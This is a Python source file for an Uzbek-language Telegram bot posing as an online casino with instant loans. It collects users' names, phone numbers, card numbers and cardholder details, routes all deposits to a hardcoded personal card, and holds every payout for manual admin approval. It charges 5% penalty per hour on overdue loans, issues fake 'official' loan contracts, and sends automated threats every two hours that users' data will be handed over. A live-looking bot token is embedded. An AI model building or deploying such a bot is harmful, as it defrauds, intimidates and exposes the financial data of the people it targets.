import telebot
from telebot import types
import re
import time
import threading
from datetime import datetime, timedelta

# --- KONFIGURATSIYA ---
TOKEN = '8609558089:AAExgvs1_XR5jlj9RGC55zZStvc7nV_Z6hE'
ADMIN_ID = 8299021738 
ADMIN_KARTA = "9860 6067 5582 9722" 
bot = telebot.TeleBot(TOKEN)

# Ma'lumotlar bazasi o'rniga vaqtinchalik xotira
users = {}

def get_user(uid):
    if uid not in users:
        users[uid] = {
            'reg': False, 'name': '', 'phone': '', 'balance': 0, 
            'loan': 0, 'loan_time': None, 'last_scare': None
        }
    return users[uid]

# --- 1. QARZ VA PENYA HISOB-KITOBI ---
def calculate_loan(uid):
    user = get_user(uid)
    penya = 0
    if user['loan'] > 0 and user['loan_time']:
        passed = datetime.now() - user['loan_time']
        hours = int(passed.total_seconds() // 3600)
        if hours > 12:
            # 12 soatdan keyin har soat uchun 5% penya
            penya = int(user['loan'] * 0.05 * (hours - 12))
    return user['loan'], penya, (user['loan'] + penya)

# --- 2. AVTOMATIK OGOHLANTIRISH TIZIMI ---
def scare_system():
    while True:
        now = datetime.now()
        for uid, u in users.items():
            if u['loan'] > 0 and u['loan_time']:
                if (now - u['loan_time']) > timedelta(hours=12):
                    # Har 2 soatda qat'iy ogohlantirish yuborish
                    if not u['last_scare'] or (now - u['last_scare']) > timedelta(hours=2):
                        try:
                            bot.send_message(uid, "‼️ **DIQQAT! QARZ MUDDATI O'TDI!**\n\nPenya hisoblanmoqda. Shartnomani buzmang, aks holda ma'lumotlaringiz chora ko'rish uchun topshiriladi!")
                            u['last_scare'] = now
                        except: pass
        time.sleep(60)

threading.Thread(target=scare_system, daemon=True).start()

# --- 3. KLAVIATURA VA MENYULAR ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🎰 777 O'yini", "💰 Balans")
    markup.row("💳 Depozit qilish", "💸 Qarz olish")
    markup.row("🏦 Qarzni to'lash", "ℹ️ Ma'lumot")
    markup.row("📤 Pul yechish")
    return markup

# --- 4. RO'YXATDAN O'TISH ---
@bot.message_handler(commands=['start'])
def start_cmd(message):
    user = get_user(message.chat.id)
    if not user['reg']:
        msg = bot.send_message(message.chat.id, "👋 Xush kelibsiz! Botdan foydalanish uchun ro'yxatdan o'ting.\n\nTo'liq Ism va Familiyangizni kiriting:")
        bot.register_next_step_handler(msg, reg_name)
    else:
        bot.send_message(message.chat.id, "Asosiy menyu tanlang:", reply_markup=main_menu())

def reg_name(message):
    get_user(message.chat.id)['name'] = message.text
    msg = bot.send_message(message.chat.id, "📞 Telefon raqamingizni kiriting:")
    bot.register_next_step_handler(msg, reg_phone)

def reg_phone(message):
    user = get_user(message.chat.id)
    user['phone'] = message.text
    user['reg'] = True
    bot.send_message(message.chat.id, "✅ Ro'yxatdan muvaffaqiyatli o'tdingiz!", reply_markup=main_menu())
    bot.send_message(ADMIN_ID, f"🆕 **YANGI AZO:**\n👤 Ism: {user['name']}\n📞 Tel: {user['phone']}\n🆔 ID: `{message.chat.id}`")

# --- 5. QARZ OLISH VA RASMIY HUJJAT ---
@bot.message_handler(func=lambda m: m.text == "💸 Qarz olish")
def loan_init(message):
    user = get_user(message.chat.id)
    if user['loan'] > 0:
        return bot.send_message(message.chat.id, "❌ Sizda to'lanmagan qarz bor!")
    
    warn_text = ("⚠️ **DIQQAT: QARZ SHARTNOMASI**\n\n"
                 "• Muddat: 12 soat (0%)\n"
                 "• Kechiksa: Har soatda **5% penya**\n"
                 "• Shart: Qarz yopilmaguncha pul yechish bloklanadi.\n\n"
                 "Ushbu shartlarga rozimisiz?")
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ Tasdiqlayman", callback_data="l_yes"),
               types.InlineKeyboardButton("❌ Orqaga", callback_data="l_no"))
    bot.send_message(message.chat.id, warn_text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda c: c.data.startswith('l_'))
def loan_callback(call):
    if call.data == "l_yes":
        msg = bot.send_message(call.message.chat.id, "💰 Qarz miqdorini yozing (100,000 - 2,000,000 UZS):")
        bot.register_next_step_handler(msg, loan_finish)
    else:
        bot.edit_message_text("Jarayon bekor qilindi.", call.message.chat.id, call.message.message_id)

def loan_finish(message):
    try:
        amt = int(re.sub(r'\D', '', message.text))
        if 100000 <= amt <= 2000000:
            user = get_user(message.chat.id)
            user['loan'] = amt
            user['balance'] += amt
            user['loan_time'] = datetime.now()
            
            doc = (f"📄 **RASMIY QARZ SHARTNOMASI №{int(time.time())}**\n"
                   f"━━━━━━━━━━━━━━━━━━━━━\n"
                   f"👤 **Qarz oluvchi:** {user['name']}\n"
                   f"💰 **Miqdor:** {amt:,} UZS\n"
                   f"📅 **Sana:** {datetime.now().strftime('%d.%m.%Y %H:%M')}\n"
                   f"⚖️ **Stavka:** 12 soatdan keyin +5% soatbay penya.\n"
                   f"━━━━━━━━━━━━━━━━━━━━━\n"
                   f"✅ **MUHR:** ONLINE CASINO FINANCE\n"
                   f"🔵 **TASDIQ:** ELEKTRON IMZO №{message.chat.id}")
            
            bot.send_message(message.chat.id, f"✅ Tabriklaymiz! {amt:,} UZS balansingizga qo'shildi.")
            bot.send_message(message.chat.id, doc, parse_mode="Markdown")
            bot.send_message(ADMIN_ID, f"💸 **QARZ SHARTNOMASI TUZILDI:**\n\n{doc}", parse_mode="Markdown")
        else: bot.send_message(message.chat.id, "❌ Limit: 100,000 - 2,000,000 UZS.")
    except: bot.send_message(message.chat.id, "⚠️ Faqat raqam kiriting.")

# --- 6. DEPOZIT VA QARZ TO'LASH (ADMIN TASDIQI) ---
@bot.message_handler(func=lambda m: m.text in ["💳 Depozit qilish", "🏦 Qarzni to'lash"])
def payment_start(message):
    mode = "DEP" if "Depozit" in message.text else "PAY"
    l, p, total = calculate_loan(message.chat.id)
    
    text = (f"💳 **TO'LOV QILISH**\n\n"
            f"Karta raqam: `{ADMIN_KARTA}`\n"
            f"👤 Egasining ismi: Admin\n\n")
    
    if mode == "PAY":
        if total == 0: return bot.send_message(message.chat.id, "✅ Sizning qarzingiz yo'q.")
        text += f"💵 Jami qarzingiz: **{total:,} UZS**\n\n"
    
    text += "Pulni o'tkazgach, summani raqamlarda yozib yuboring:"
    msg = bot.send_message(message.chat.id, text, parse_mode="Markdown")
    bot.register_next_step_handler(msg, lambda m: payment_req(m, mode))

def payment_req(message, mode):
    try:
        amt = int(re.sub(r'\D', '', message.text))
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ TASTIQLASH", callback_data=f"adm_ok_{mode}_{message.chat.id}_{amt}"),
                   types.InlineKeyboardButton("❌ TASTIQLANMADI", callback_data=f"adm_no_{mode}_{message.chat.id}"))
        
        t_title = "📥 DEPOZIT" if mode == "DEP" else "🏦 QARZ TO'LOVI"
        bot.send_message(ADMIN_ID, f"🔔 **{t_title} SO'ROVI**\nID: `{message.chat.id}`\nSumma: **{amt:,} UZS**", reply_markup=markup, parse_mode="Markdown")
        bot.send_message(message.chat.id, "⌛️ So'rov adminga yuborildi. Tasdiqlashni kiting.")
    except: bot.send_message(message.chat.id, "⚠️ Miqdorni raqamda yozing.")

# --- 7. PUL YECHISH (MAJBURURiy MA'LUMOTLAR BILAN) ---
@bot.message_handler(func=lambda m: m.text == "📤 Pul yechish")
def withdraw_init(message):
    user = get_user(message.chat.id)
    _, _, total_loan = calculate_loan(message.chat.id)
    if total_loan > 0:
        return bot.send_message(message.chat.id, f"❌ Qarzingiz bor ({total_loan:,} UZS). Avval qarzni yoping!")
    
    if user['balance'] < 300000:
        return bot.send_message(message.chat.id, "⚠️ Minimal yechish: 300,000 UZS.")
    
    msg = bot.send_message(message.chat.id, "💳 Karta raqamingizni kiriting:")
    bot.register_next_step_handler(msg, withdraw_step2)

def withdraw_step2(message):
    card = message.text
    msg = bot.send_message(message.chat.id, "👤 Karta egasining Ism Familiyasini kiriting (Majburiy):")
    bot.register_next_step_handler(msg, lambda m: withdraw_step3(m, card))

def withdraw_step3(message, card):
    owner_name = message.text
    msg = bot.send_message(message.chat.id, "📞 Karta egasining telefon raqamini kiriting (Majburiy):")
    bot.register_next_step_handler(msg, lambda m: withdraw_step4(m, card, owner_name))

def withdraw_step4(message, card, owner_name):
    owner_phone = message.text
    msg = bot.send_message(message.chat.id, "💰 Qancha yechmoqchisiz? (300k - 3mln):")
    bot.register_next_step_handler(msg, lambda m: withdraw_final(m, card, owner_name, owner_phone))

def withdraw_final(message, card, name, phone):
    try:
        amt = int(re.sub(r'\D', '', message.text))
        user = get_user(message.chat.id)
        if 300000 <= amt <= 3000000 and user['balance'] >= amt:
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("✅ Pul tushdi", callback_data=f"adm_ok_WDR_{message.chat.id}_{amt}"),
                       types.InlineKeyboardButton("❌ Pul tushmadi", callback_data=f"adm_no_WDR_{message.chat.id}"))
            
            admin_msg = (f"📤 **PUL YECHISH SO'ROVI**\n"
                         f"💰 Summa: {amt:,} UZS\n"
                         f"💳 Karta: `{card}`\n"
                         f"👤 Egasi: {name}\n"
                         f"📞 Tel: {phone}")
            bot.send_message(ADMIN_ID, admin_msg, reply_markup=markup, parse_mode="Markdown")
            bot.send_message(message.chat.id, "⌛️ So'rov adminga yuborildi.")
        else: bot.send_message(message.chat.id, "❌ Limit xato yoki balans yetarsiz.")
    except: bot.send_message(message.chat.id, "⚠️ Raqam yozing.")

# --- 8. ADMIN CALLBACK HANDLER ---
@bot.callback_query_handler(func=lambda c: c.data.startswith('adm_'))
def admin_callback(call):
    data = call.data.split('_')
    status, mode, uid, amt = data[1], data[2], int(data[3]), int(data[4] if len(data) > 4 else 0)
    user = get_user(uid)

    if status == 'ok':
        if mode == 'DEP':
            user['balance'] += amt
            bot.send_message(uid, f"✅ Depozit tasdiqlandi! +{amt:,} UZS")
        elif mode == 'PAY':
            user['loan'] = max(0, user['loan'] - amt)
            if user['loan'] == 0: user['loan_time'] = None
            bot.send_message(uid, f"✅ Qarz to'lovi tasdiqlandi! Qolgan qarz: {user['loan']:,} UZS")
        elif mode == 'WDR':
            user['balance'] -= amt
            bot.send_message(uid, f"✅ Pul tushdi! Yechildi: {amt:,} UZS")
        bot.edit_message_text(f"✅ Bajarildi ({mode}): {amt:,}", call.message.chat.id, call.message.message_id)
    else:
        bot.send_message(uid, "❌ So'rovingiz admin tomonidan rad etildi!")
        bot.edit_message_text(f"❌ Rad etildi ({mode})", call.message.chat.id, call.message.message_id)

# --- 9. O'YINLAR VA MA'LUMOT TIZIMI ---
@bot.message_handler(func=lambda m: m.text == "🎰 777 O'yini")
def game_777(message):
    user = get_user(message.chat.id)
    if user['balance'] < 100000:
        return bot.send_message(message.chat.id, "⚠️ Balans kam (minimal 100,000 UZS).")
    user['balance'] -= 100000
    dice = bot.send_dice(message.chat.id, emoji='🎰')
    time.sleep(4)
    if dice.value in [1, 22, 43, 64]:
        user['balance'] += 300000
        bot.reply_to(dice, "🎉 YUTDINGIZ! Balansingizga +300,000 UZS qo'shildi!")
    else: bot.reply_to(dice, "😟 Yutqazdingiz. Omadingizni yana bir bor sinang!")

@bot.message_handler(func=lambda m: m.text == "💰 Balans")
def show_balance(message):
    l, p, total = calculate_loan(message.chat.id)
    user = get_user(message.chat.id)
    bot.send_message(message.chat.id, f"💵 **BALANS:** {user['balance']:,} UZS\n💸 **QARZ:** {l:,} UZS\n⚠️ **PENYA:** {p:,} UZS\n🚀 **JAMI TO'LOV:** {total:,} UZS", parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "ℹ️ Ma'lumot")
def info_view(message):
    uid = message.chat.id
    if uid == ADMIN_ID:
        # Admin uchun hamma foydalanuvchilar hisoboti
        report = "📊 **BOT STATISTIKASI (ADMIN)**\n━━━━━━━━━━━━━━━\n"
        for u_id, data in users.items():
            _, _, u_total = calculate_loan(u_id)
            report += f"👤 {data['name']}\n🆔 `{u_id}` | 📞 {data['phone']}\n💰 Balans: {data['balance']:,} | 💸 Qarz: {u_total:,}\n━━━━━━━━━━━━━━━\n"
        bot.send_message(ADMIN_ID, report, parse_mode="Markdown")
    else:
        # Foydalanuvchi uchun shaxsiy ma'lumotlar
        user = get_user(uid)
        _, _, total = calculate_loan(uid)
        text = (f"👤 **SHAXSIY MA'LUMOTLAR**\n━━━━━━━━━━━━━━━\n"
                f"🆔 ID: `{uid}`\n"
                f"👤 Ism: {user['name']}\n"
                f"📞 Tel: {user['phone']}\n"
                f"💰 Balans: {user['balance']:,} UZS\n"
                f"💸 Jami qarz: {total:,} UZS")
        bot.send_message(uid, text, parse_mode="Markdown")

bot.polling(none_stop=True)
  
